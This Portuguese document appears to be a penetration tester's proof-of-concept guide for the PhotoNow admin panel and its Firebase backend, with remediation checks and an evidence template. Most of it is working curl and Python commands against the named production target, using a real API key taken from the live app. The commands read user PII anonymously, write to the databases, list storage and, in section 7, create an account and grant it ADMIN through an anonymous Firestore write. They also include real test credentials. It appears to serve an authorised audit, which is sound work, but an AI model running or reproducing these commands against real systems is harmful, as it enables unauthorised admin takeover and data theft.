# PoCs — Painel Admin PhotoNow

**Alvo:** https://admin.photonow.com.br/login  
**Projeto Firebase:** `photonow-app`  
**Documento relacionado:** [RELATORIO-SEGURANCA-ADMIN-PHOTONOW.md](./RELATORIO-SEGURANCA-ADMIN-PHOTONOW.md) (achados e correções)

---

## Uso responsável

- Execute **somente** no seu ambiente, com autorização.
- Use e-mails e dados **de teste**; não altere contas reais de produção.
- Após qualquer teste de **escrita**, faça a **limpeza** indicada.
- Não publique saídas com PII (e-mails, nomes de totens, etc.).

---

## Pré-requisitos

```bash
export API_KEY="AIzaSyBlEgFftjgHDznfDiLGxTup9otxIxE6B4U"
export RTDB="https://photonow-app-default-rtdb.firebaseio.com"
export FS="https://firestore.googleapis.com/v1/projects/photonow-app/databases/(default)/documents"
export STORAGE="https://firebasestorage.googleapis.com/v0/b/photonow-app.appspot.com/o"
```

| Script | Função |
|--------|--------|
| `./poc-firebase-photonow.sh` | PoCs 1–6 automatizados (RTDB, Firestore, Storage) |
| `./poc-criar-admin.sh` | PoC 7 — criar usuário Auth + `users/{uid}` ADMIN |

```bash
chmod +x poc-firebase-photonow.sh poc-criar-admin.sh
./poc-firebase-photonow.sh | tee evidencia-$(date +%Y%m%d).txt
```

---

## Índice de PoCs

| ID | Severidade | Título | Seção |
|----|------------|--------|-------|
| PoC-1 | Crítico | RTDB — leitura anônima | §1 |
| PoC-2 | Crítico | RTDB — escrita anônima | §2 |
| PoC-3 | Crítico | Firestore `users` — leitura | §3 |
| PoC-4 | Crítico | Firestore — escrita anônima | §4 |
| PoC-5 | Crítico | Firestore — outras coleções | §5 |
| PoC-6 | Alto | Storage — listagem | §6 |
| PoC-7 | Crítico | Criar usuário ADMIN (Auth + Firestore) | §7 |
| PoC-8 | Médio | RBAC só no frontend | §8 |
| PoC-9 | Médio | Source maps expostos | §9 |
| PoC-10 | Info | RTDB homologação (`cabine-teste`) | §10 |

---

## Validação pós-correção (resumo)

| Teste | Vulnerável | Corrigido |
|-------|------------|-----------|
| RTDB `GET /.json?shallow=true` | 200 + muitos bytes | `Permission denied` |
| RTDB `PUT /_poc_seguranca.json` | 200 | Negado |
| Firestore `GET /users` | 200 + `documents` | `403 PERMISSION_DENIED` |
| Firestore `POST /_poc_seguranca` | 200 | `403` |
| Storage `GET /o` | 200 + `items` | `403` ou erro |
| PoC-7 login admin | Dashboard admin | Falha em Auth/Firestore/login |

Detalhes: [§11](#11-validação-após-correção).

---

## 1. PoC-1 — RTDB leitura anônima

**CWE-306** — Missing Authentication for Critical Function

```bash
# Listar chaves de topo
curl -s "${RTDB}/.json?shallow=true" | python3 -m json.tool | head -40

# Evidência rápida (tamanho da resposta)
curl -s "${RTDB}/.json?shallow=true" | wc -c

# Ler um nó (substitua ID retornado no shallow)
curl -s "${RTDB}/SEU_ID_AQUI.json" | python3 -m json.tool
```

**Vulnerável:** JSON com `name`, `status`, `status_payment`, `base_dir`, etc.  
**Corrigido:** `"error": "Permission denied"` ou corpo vazio com erro.

---

## 2. PoC-2 — RTDB escrita anônima

```bash
curl -s -X PUT "${RTDB}/_poc_seguranca.json" \
  -H "Content-Type: application/json" \
  -d '{"poc":true,"timestamp":"'"$(date -Iseconds)"'"}'

curl -s "${RTDB}/_poc_seguranca.json"

# Limpeza obrigatória
curl -s -X DELETE "${RTDB}/_poc_seguranca.json"
```

**Vulnerável:** PUT retorna `{"poc":true,...}`; DELETE retorna `null`.

---

## 3. PoC-3 — Firestore `users` leitura anônima

```bash
curl -s "${FS}/users?pageSize=3" \
  -H "X-Goog-Api-Key: ${API_KEY}" | python3 -m json.tool
```

**Metadados sem expor e-mail no relatório:**

```bash
curl -s "${FS}/users?pageSize=5" -H "X-Goog-Api-Key: ${API_KEY}" \
| python3 -c "
import json,sys
d=json.load(sys.stdin)
for doc in d.get('documents',[]):
    f=doc['fields']
    uid=doc['name'].split('/')[-1]
    roles=[v['stringValue'] for v in f.get('role',{}).get('arrayValue',{}).get('values',[])]
    print(uid, roles, f.get('status',{}).get('stringValue','?'))
"
```

**Vulnerável:** campo `"documents"` com `nome`, `email`, `role`, `franqueado_id`, `status`.

---

## 4. PoC-4 — Firestore escrita anônima

```bash
RESP=$(curl -s -X POST "${FS}/_poc_seguranca" \
  -H "X-Goog-Api-Key: ${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"fields":{"poc":{"booleanValue":true}}}')

echo "$RESP" | python3 -m json.tool
DOC=$(echo "$RESP" | python3 -c "import json,sys; print(json.load(sys.stdin)['name'])")
curl -s -X DELETE "https://firestore.googleapis.com/v1/${DOC}" \
  -H "X-Goog-Api-Key: ${API_KEY}"
```

**Alternativa com ID fixo:**

```bash
curl -s -X PATCH \
  "${FS}/_poc_seguranca/poc-teste-001?updateMask.fieldPaths=poc" \
  -H "X-Goog-Api-Key: ${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"fields":{"poc":{"booleanValue":true}}}'

curl -s -X DELETE "${FS}/_poc_seguranca/poc-teste-001" \
  -H "X-Goog-Api-Key: ${API_KEY}"
```

---

## 5. PoC-5 — Firestore outras coleções (leitura)

```bash
for col in totem userFranqueado compras logs molduras cupons configuracao; do
  code=$(curl -s -o /tmp/out.json -w "%{http_code}" \
    "${FS}/${col}?pageSize=1" -H "X-Goog-Api-Key: ${API_KEY}")
  bytes=$(wc -c < /tmp/out.json)
  echo "${col} → HTTP ${code}, ${bytes} bytes"
done
```

**Resultado observado na auditoria (22/05/2026):**

| Coleção | HTTP | Leitura anônima |
|---------|------|-----------------|
| totem | 200 | Sim (~17 KB na 1ª página) |
| userFranqueado | 200 | Sim |
| compras | 200 | Sim |
| molduras | 200 | Sim |
| cupons | 200 | Sim |
| logs / configuracao | 200 | Mínimo / vazio |

---

## 6. PoC-6 — Storage listagem pública

```bash
curl -s "${STORAGE}?maxResults=5" \
  -H "X-Firebase-Storage-Key: ${API_KEY}" | python3 -m json.tool
```

**Download (substitua PATH pelo `name` retornado, URL-encoded):**

```bash
curl -s "https://firebasestorage.googleapis.com/v0/b/photonow-app.appspot.com/o/PATH%2Fprint_error.txt?alt=media" \
  -H "X-Firebase-Storage-Key: ${API_KEY}" | head -c 500
```

---

## 7. PoC-7 — Criar usuário com perfil ADMIN

Valida a cadeia **Auth + Firestore `users/{uid}` com `ADMIN`**, igual ao painel após login.

### 7.1 Fluxo esperado pelo painel

1. `signInWithEmailAndPassword` → Firebase Auth  
2. Lê `users/{uid}` no Firestore  
3. Se existe e tem `role` → dashboard; senão → *“você não tem acesso”*

| Parte | Onde | O quê |
|-------|------|--------|
| A | Firebase Auth | email/senha → `uid` |
| B | Firestore `users/{uid}` | `role: ["ADMIN"]`, `status: "ATIVO"`, etc. |

### 7.2 Variáveis de teste

```bash
export EMAIL="poc-seguranca+teste@seudominio.com"   # seu e-mail de teste
export SENHA="PoC-Seguranca-2026!Altere"
export NOME="Usuario PoC Seguranca"
```

### 7.3 Passo 1 — Criar conta Auth

```bash
curl -s -X POST \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${API_KEY}" \
  -H "Content-Type: application/json" \
  -H "Referer: https://admin.photonow.com.br/" \
  -H "Origin: https://admin.photonow.com.br" \
  -d "{\"email\":\"${EMAIL}\",\"password\":\"${SENHA}\",\"returnSecureToken\":true}" \
  | tee /tmp/poc-signup.json | python3 -m json.tool

export FB_UID=$(python3 -c "import json; print(json.load(open('/tmp/poc-signup.json'))['localId'])")
echo "FB_UID: ${FB_UID}"
```

> **Armadilha (zsh/bash):** não use a variável `UID` — no zsh ela já existe e vale o UID numérico do usuário Linux (ex.: `1000`), quebrando o PATCH no Firestore. Use sempre `FB_UID`.

| Erro | Ação |
|------|------|
| `OPERATION_NOT_ALLOWED` | Cadastro desabilitado → use §7.5 (Console) só para obter UID |
| `EMAIL_EXISTS` | Troque `$EMAIL` ou apague usuário no Console |
| Referer blocked | §7.5 — criar usuário no Console Firebase |

### 7.4 Passo 2 — Documento `users/{uid}` com ADMIN

```bash
curl -s -X PATCH \
  "${FS}/users/${FB_UID}?updateMask.fieldPaths=nome&updateMask.fieldPaths=email&updateMask.fieldPaths=status&updateMask.fieldPaths=role" \
  -H "X-Goog-Api-Key: ${API_KEY}" \
  -H "Content-Type: application/json" \
  -d "{
    \"fields\": {
      \"nome\": {\"stringValue\": \"${NOME}\"},
      \"email\": {\"stringValue\": \"${EMAIL}\"},
      \"status\": {\"stringValue\": \"ATIVO\"},
      \"role\": {\"arrayValue\": {\"values\": [{\"stringValue\": \"ADMIN\"}]}}
    }
  }" | python3 -m json.tool

curl -s "${FS}/users/${FB_UID}" -H "X-Goog-Api-Key: ${API_KEY}" \
| python3 -c "
import json,sys
d=json.load(sys.stdin)
roles=[v['stringValue'] for v in d['fields']['role']['arrayValue']['values']]
assert 'ADMIN' in roles; print('OK — ADMIN gravado')
"
```

### 7.5 Alternativa — Auth pelo Console

1. [Console Firebase](https://console.firebase.google.com/) → `photonow-app`  
2. **Authentication** → **Add user** → copiar **UID**  
3. `export FB_UID="..."` e executar só §7.4  

### 7.6 Passo 3 — Login no painel

1. https://admin.photonow.com.br/login  
2. `$EMAIL` / `$SENHA`  
3. **Vulnerável:** dashboard com menus de Administrador  
4. **Corrigido:** erro no passo 2 ou login sem acesso  

**Script automatizado:**

```bash
./poc-criar-admin.sh "${EMAIL}" "${SENHA}"
```

### 7.7 Limpeza

```bash
# 1) Firestore
curl -s -X DELETE "${FS}/users/${FB_UID}" -H "X-Goog-Api-Key: ${API_KEY}"

# 2) Auth — login para pegar idToken, depois delete
curl -s -X POST \
  "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${API_KEY}" \
  -H "Content-Type: application/json" \
  -H "Referer: https://admin.photonow.com.br/" \
  -d "{\"email\":\"${EMAIL}\",\"password\":\"${SENHA}\",\"returnSecureToken\":true}" \
  > /tmp/poc-signin.json

ID_TOKEN=$(python3 -c "import json; print(json.load(open('/tmp/poc-signin.json'))['idToken'])")

curl -s -X POST \
  "https://identitytoolkit.googleapis.com/v1/accounts:delete?key=${API_KEY}" \
  -H "Content-Type: application/json" \
  -H "Referer: https://admin.photonow.com.br/" \
  -d "{\"idToken\":\"${ID_TOKEN}\"}"
```

> Na limpeza via API, `signInWithPassword` e `delete` também precisam de `Referer`/`Origin`, senão a apiKey bloqueia.

Alternativa: Console → **Authentication** → excluir usuário manualmente.

### 7.8 Interpretação

| Cenário | Auth | Firestore | Login admin |
|---------|------|-----------|-------------|
| Pior caso | OK | OK anônimo | OK |
| Parcial | Bloqueado | OK anônimo | Não |
| Corrigido | — | `403` | Não |

### 7.9 Execução real validada (22/05/2026) — passo a passo completo

Esta seção documenta **exatamente** como o usuário ADMIN de teste foi criado, validado no painel (**login OK**) e removido. Serve de referência caso sua tentativa anterior tenha falhado.

#### Contexto do ataque (o que o painel exige)

```
Atacante / auditor
    │
    ├─► [1] Identity Toolkit: accounts:signUp
    │         → cria conta email/senha no Firebase Auth
    │         → retorna localId (= uid usado no Firestore)
    │
    ├─► [2] Firestore REST: PATCH users/{localId}
    │         → SEM Authorization header (rules abertas)
    │         → grava role: ["ADMIN"], status: "ATIVO"
    │
    └─► [3] Browser: https://admin.photonow.com.br/login
              → signInWithEmailAndPassword (mesmo email/senha)
              → app lê users/{uid} → encontra ADMIN → dashboard
```

Sem o passo **2**, o login até pode autenticar no Auth, mas o app mostra *“você não tem acesso ao dashboard”* porque `users/{uid}` não existe.

#### Pré-requisitos usados

| Variável | Valor usado na execução |
|----------|-------------------------|
| `API_KEY` | `AIzaSyBlEgFftjgHDznfDiLGxTup9otxIxE6B4U` (extraída do `app.js` em produção) |
| `EMAIL` | `poc.admin.photonow.220526@gmail.com` |
| `SENHA` | `PoC-PhotoNow-Admin-2026!` |
| `NOME` | `Usuario PoC Seguranca PhotoNow` |
| `FS` | `https://firestore.googleapis.com/v1/projects/photonow-app/databases/(default)/documents` |

> O e-mail não precisa ser uma caixa real que você controle: o Firebase Auth cria a identidade internamente. Para login basta o par email/senha cadastrados no passo 1.

#### Passo 1 — Criar conta no Firebase Authentication

**Endpoint:** `POST https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={API_KEY}`

**Por que os headers `Referer` e `Origin`?**  
A apiKey do projeto pode estar restrita a requisições vindas de `https://admin.photonow.com.br`. Sem esses headers, o Google retorna *“Requests from referer &lt;empty&gt; are blocked”*.

**Comando executado:**

```bash
export PATH="/usr/bin:/bin:$PATH"
export API_KEY="AIzaSyBlEgFftjgHDznfDiLGxTup9otxIxE6B4U"
export EMAIL="poc.admin.photonow.220526@gmail.com"
export SENHA='PoC-PhotoNow-Admin-2026!'

curl -s -X POST \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${API_KEY}" \
  -H "Content-Type: application/json" \
  -H "Referer: https://admin.photonow.com.br/" \
  -H "Origin: https://admin.photonow.com.br" \
  -d "{\"email\":\"${EMAIL}\",\"password\":\"${SENHA}\",\"returnSecureToken\":true}" \
  | tee /tmp/poc-signup.json | python3 -m json.tool
```

**Resposta obtida (sucesso):**

| Campo | Valor |
|-------|--------|
| HTTP | `200` |
| `kind` | `identitytoolkit#SignupNewUserResponse` |
| `localId` | `5hUYOrWnA0hq1TvEiFAFpPAvesZ2` ← **este é o `FB_UID`** |
| `email` | igual ao `$EMAIL` |
| `idToken` | JWT temporário (1h) — não necessário para o passo 2 |
| `emailVerified` | `false` |

**Extrair o UID (obrigatório para o passo 2):**

```bash
export FB_UID=$(python3 -c "import json; print(json.load(open('/tmp/poc-signup.json'))['localId'])")
echo "FB_UID=${FB_UID}"
# Saída: FB_UID=5hUYOrWnA0hq1TvEiFAFpPAvesZ2
```

**Erro comum que você pode ter tido:**

```bash
export UID=$(python3 -c "...")   # ERRADO no zsh
# UID vira 1000 (usuário Linux) → PATCH em users/1000 → falha ou doc errado
```

#### Passo 2 — Gravar perfil ADMIN no Firestore (sem estar logado)

**Endpoint:** `PATCH {FS}/users/{FB_UID}` com `updateMask` nos campos alterados.

**Por que PATCH e não POST?**  
O ID do documento **deve** ser o mesmo `localId` do Auth. PATCH em `users/5hUYOrWnA0hq1TvEiFAFpPAvesZ2` cria o documento se não existir (comportamento upsert na API REST).

**Corpo no formato REST do Firestore** (cada campo tipado):

| Campo app | Tipo Firestore REST | Valor |
|-----------|-------------------|--------|
| `nome` | `stringValue` | `Usuario PoC Seguranca PhotoNow` |
| `email` | `stringValue` | mesmo do Auth |
| `status` | `stringValue` | `ATIVO` |
| `role` | `arrayValue` → `values[]` → `stringValue` | `ADMIN` |

O frontend espera `role` como **array** (ex.: `["ADMIN"]`), não string simples.

**Comando executado:**

```bash
export NOME="Usuario PoC Seguranca PhotoNow"
export FS="https://firestore.googleapis.com/v1/projects/photonow-app/databases/(default)/documents"

curl -s -X PATCH \
  "${FS}/users/${FB_UID}?updateMask.fieldPaths=nome&updateMask.fieldPaths=email&updateMask.fieldPaths=status&updateMask.fieldPaths=role" \
  -H "X-Goog-Api-Key: ${API_KEY}" \
  -H "Content-Type: application/json" \
  -d "{
    \"fields\": {
      \"nome\": {\"stringValue\": \"${NOME}\"},
      \"email\": {\"stringValue\": \"${EMAIL}\"},
      \"status\": {\"stringValue\": \"ATIVO\"},
      \"role\": {\"arrayValue\": {\"values\": [{\"stringValue\": \"ADMIN\"}]}}
    }
  }" | python3 -m json.tool
```

**Resposta esperada:** JSON com `"name": ".../documents/users/5hUYOrWnA0hq1TvEiFAFpPAvesZ2"` e `fields.role` contendo `ADMIN`.

**Verificação (leitura anônima — prova da vulnerabilidade):**

```bash
curl -s "${FS}/users/${FB_UID}" -H "X-Goog-Api-Key: ${API_KEY}" \
| python3 -c "
import json,sys
d=json.load(sys.stdin)
print('email:', d['fields']['email']['stringValue'])
print('status:', d['fields']['status']['stringValue'])
print('roles:', [v['stringValue'] for v in d['fields']['role']['arrayValue']['values']])
"
```

**Saída obtida:**

```
email: poc.admin.photonow.220526@gmail.com
status: ATIVO
roles: ['ADMIN']
```

Nenhum header `Authorization: Bearer` foi enviado — a escrita e a leitura funcionaram **anônimas**.

#### Passo 3 — Login no painel (validação humana)

1. Abrir https://admin.photonow.com.br/login  
2. E-mail: `poc.admin.photonow.220526@gmail.com`  
3. Senha: `PoC-PhotoNow-Admin-2026!`  
4. O app executa internamente:
   - Firebase Auth → OK  
   - `getDoc(users/5hUYOrWnA0hq1TvEiFAFpPAvesZ2)` → existe, `role` inclui `ADMIN`  
   - Redireciona para o dashboard com menus de administrador  

**Resultado:** confirmado pelo operador — **deu ok**.

#### Passo 4 — Limpeza após confirmação

Após o teste, remover **ambos** os artefatos:

```bash
# 4.1 — Firestore
curl -s -X DELETE \
  "${FS}/users/${FB_UID}" \
  -H "X-Goog-Api-Key: ${API_KEY}"

# 4.2 — Auth (precisa de idToken do próprio usuário)
curl -s -X POST \
  "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${API_KEY}" \
  -H "Content-Type: application/json" \
  -H "Referer: https://admin.photonow.com.br/" \
  -d "{\"email\":\"${EMAIL}\",\"password\":\"${SENHA}\",\"returnSecureToken\":true}" \
  > /tmp/poc-signin.json

export ID_TOKEN=$(python3 -c "import json; print(json.load(open('/tmp/poc-signin.json'))['idToken'])")

curl -s -X POST \
  "https://identitytoolkit.googleapis.com/v1/accounts:delete?key=${API_KEY}" \
  -H "Content-Type: application/json" \
  -d "{\"idToken\":\"${ID_TOKEN}\"}"
```

**Status pós-limpeza (22/05/2026):** documento Firestore e conta Auth do usuário de teste **removidos**.

#### Script único (reproduzir do zero)

Equivalente aos passos 1–2:

```bash
cd "/home/client01/Área de trabalho/Photonow"
./poc-criar-admin.sh "seu-email-de-teste@dominio.com" 'SuaSenhaForte!2026'
# Depois login manual → limpeza §7.7
```

O script `poc-criar-admin.sh` já envia `Referer`/`Origin` e usa variáveis internas sem conflito com `UID` do shell.

#### Checklist de troubleshooting

| Sintoma | Causa provável | Correção |
|---------|----------------|----------|
| Referer blocked no signUp | apiKey restrita | Adicionar headers Referer/Origin ou criar user no Console (§7.5) |
| Login OK mas “sem acesso ao dashboard” | Falta documento `users/{uid}` | Executar passo 2 com `FB_UID` correto do signUp |
| PATCH em `users/1000` ou uid estranho | Variável `UID` no zsh | Renomear para `FB_UID` |
| `EMAIL_EXISTS` | Conta já criada | Outro e-mail ou apagar no Console |
| `OPERATION_NOT_ALLOWED` | Cadastro desabilitado no Auth | Só passo 2 após criar user no Console |
| Login OK após corrigir rules | PoC deixa de funcionar | Esperado — rules corretas bloqueiam passo 2 anônimo |

#### O que esta PoC prova para o relatório

1. **Cadastro público** no Identity Toolkit (com referer do admin) está **ativo**.  
2. **Firestore** aceita **escrita anônima** em `users/{uid}` com role administrativa.  
3. O **painel confia** no documento Firestore após Auth — não valida role no servidor.  
4. Um atacante pode obter **controle administrativo completo** em poucos comandos `curl`.

---

## 8. PoC-8 — RBAC só no frontend

## 8. PoC-8 — RBAC só no frontend

1. Abra https://admin.photonow.com.br/login **sem** login  
2. Execute PoC-3 ou PoC-5 via `curl`  
3. Compare: UI bloqueia rotas, API expõe dados  

| Camada | Protege? |
|--------|----------|
| Vue Router | Só UI |
| Firebase Rules | Deveria — hoje não |
| Firebase Auth | Identidade; não autoriza Firestore sozinho |

---

## 9. PoC-9 — Source maps em produção

```bash
curl -s "https://admin.photonow.com.br/js/app.983e92f1.js.map" | python3 -c "
import json,sys
m=json.load(sys.stdin)
for s in m.get('sources',[])[:15]:
    print(' ', s)
"
```

---

## 10. PoC-10 — RTDB homologação

```bash
curl -s "https://cabine-teste-default-rtdb.firebaseio.com/.json?shallow=true" | head -c 400
```

---

## 11. Validação após correção

Repita os PoCs 1–6 e 7. Com login legítimo, teste leitura **com** token:

```bash
curl -s "${FS}/users/SEU_UID" \
  -H "X-Goog-Api-Key: ${API_KEY}" \
  -H "Authorization: Bearer ID_TOKEN_DO_DEVTOOLS"
```

Deve retornar apenas o permitido pelas rules para aquele usuário.

---

## 12. Template de evidência (gestão / cliente)

```markdown
## Evidências PoC PhotoNow — ___/___/2026

**Executor:** _______________  
**Ambiente:** [ ] produção  [ ] staging  

| PoC | Descrição | Resultado | Status |
|-----|-----------|-----------|--------|
| PoC-1 | RTDB leitura | ___ bytes | [ ] Vuln [ ] OK |
| PoC-2 | RTDB escrita | ___ | [ ] Vuln [ ] OK |
| PoC-3 | Firestore users | HTTP ___ | [ ] Vuln [ ] OK |
| PoC-4 | Firestore escrita | ___ | [ ] Vuln [ ] OK |
| PoC-5 | Outras coleções | ___ | [ ] Vuln [ ] OK |
| PoC-6 | Storage | ___ itens | [ ] Vuln [ ] OK |
| PoC-7 | Admin criado/login | ___ | [ ] Vuln [ ] OK |

**Anexos:** terminal (PII borrada), Rules antes/depois, screenshot login.
```

---

## Histórico

| Versão | Data | Notas |
|--------|------|-------|
| 1.0 | 22/05/2026 | Documento PoC extraído do relatório principal |
| 1.1 | 22/05/2026 | §7.9 execução real validada; fix variável `FB_UID`; limpeza usuário teste |

---

*PoCs para auditoria interna PhotoNow. Confidencial.*
